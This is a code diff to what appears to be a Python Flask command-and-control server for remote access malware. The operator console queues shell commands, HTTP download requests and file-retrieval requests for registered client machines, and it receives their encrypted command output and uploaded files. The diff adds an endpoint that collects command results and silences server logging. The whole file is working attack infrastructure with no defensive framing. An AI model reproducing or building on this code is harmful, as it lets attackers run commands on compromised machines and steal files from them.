@@ -1,7 +1,8 @@
+import logging
 import threading
 import time
 from urllib.parse import urlparse
-from flask import Flask, request, jsonify
+from flask import Flask, request
 import os
 import uuid
 import re
@@ -20,17 +21,35 @@ def hello():
     random_uuid_str = str(uuid.uuid4())
     cript_session = Ecrypt(isServer=True)
     clients.append({"cid": random_uuid_str, "cs": cript_session})
-    return jsonify({"cid": random_uuid_str, "pubkey": cript_session.get_public_key()})
+    pubkey = cript_session.public_key_to_string()
+    print(pubkey)
+    return {"cid": random_uuid_str, "pubkey": pubkey}
 
 
 @app.route('/list/<cid>', methods=['GET'])
 def get_next_command(cid):
     message = message_queue.get_next_message(cid)
     if message:
-        return jsonify(message)
+        return message
     else:
-        return jsonify({})
+        return {}
 
+
+@app.route('/command', methods=['POST'])
+def receive_cmd():
+    id = request.form.get('id')
+    cid = request.form.get('cid')
+    cmd = request.form.get('output')
+    cs = None
+    for client in clients:
+        if client["cid"] == cid:
+            cs = client["cs"]
+    if not cs:
+        return {"message": "Realy?"}, 500
+    ret=cs.decrypt(cmd)
+    print(f"Return from cid:{cid}-id:{id}")
+    print(ret)
+    return {"ok":"ok"},200
 
 @app.route('/upload', methods=['POST'])
 def upload_file():
@@ -43,19 +62,20 @@ def upload_file():
         if client["cid"] == cid:
             cs = client["cs"]
     if not cs:
-        return jsonify({"message": "Realy?"}), 500
+        return {"message": "Realy?"}, 500
     try:
         folder_path = os.path.join("uploads", cid, id)
         os.makedirs(folder_path, exist_ok=True)
         path = os.path.join(folder_path, name)
         cs.decrypt_file(file).save(path)
-    except Exception as e:
-        return jsonify({"message": "Realy?"}), 500
+    except Exception:
+        return {"message": "Realy?"}, 500
 
     print("Arquivo baixado:")
     print(path)
     local_queue.add_message(cid, {"id": id, "typ": "file", "loc": path})
-    return jsonify({"message": "Upload realizado com sucesso."}), 200
+    return {"message": "Upload realizado com sucesso."}, 200
+
 
 
 @app.route('/error', methods=['POST'])
@@ -66,7 +86,7 @@ def handle_error():
 
     local_queue.add_message(cid, {"id": id, "typ": "erro", "msg": ret})
     print(ret)
-    return jsonify({"message": f"Erro recebido: {id}"}), 200
+    return {"message": f"Erro recebido: {id}"}, 200
 
 
 @app.route('/add_message', methods=['POST'])
@@ -75,16 +95,16 @@ def add_message():
     user_id = data['user_id']
     message = data['message']
     message_queue.add_message(user_id, message)
-    return jsonify({"status": "Message added successfully for user with ID: " + str(user_id)})
+    return {"status": f"Message added successfully for user with ID:{str(user_id)} "}
 
 
 @app.route('/get_next_message/<int:user_id>', methods=['GET'])
 def get_next_message(user_id):
     message = message_queue.get_next_message(user_id)
     if message:
-        return jsonify({"message": message})
+        return  {"message": message}
     else:
-        return jsonify({"status": "No more messages for user with ID " + str(user_id)})
+        return {"status": f"No more messages for user with ID {str(user_id)}"}
 
 
 def is_http_url(url):
@@ -131,8 +151,9 @@ def process_commands():
         except Exception:
             print("invalid client")
         if cli:
-            print(
-                "To perform a download, use 'dl url method=POST/GET headers={Authorization: Bearer ehauehasuhsad} data={variable:value}'. To start 'dl' for download or enter a command if you want to send an HTTP request.")
+            print("To perform a download:") 
+            print("'dl url method=POST/GET headers={Authorization: Bearer ehauehasuhsad} data={variable:value}'.")
+            print("To start 'dl' for download or enter a command if you want to send an HTTP request.")
             print("To download a file, use 'filedl file_path'.")
             print("To execute a command on the client, enter the command.")
             print("Or type 'qq' to return to the list of clients.")
@@ -143,13 +164,13 @@ def process_commands():
                     break
                 if command.startswith('dl'):
                     url, method, headers, data = parse_dl_string(command)
-                    execute_command(client["cid"], 'dl',
+                    execute_command(cli["cid"], 'dl',
                                     url, method, headers, data)
                 elif command.startswith('filedl'):
                     command = command.replace("filedl", "").strip()
-                    execute_command(client["cid"], 'filedl', command)
+                    execute_command(cli["cid"], 'filedl', command)
                 else:
-                    execute_command(client["cid"], 'cmd', command)
+                    execute_command(cli["cid"], 'cmd', command)
 
                 print("Aguardando o envio")
                 time.sleep(4)
@@ -163,4 +184,7 @@ def main():
 
 
 if __name__ == '__main__':
+    log = logging.getLogger('werkzeug')
+    log.setLevel(logging.ERROR)
     main()
+
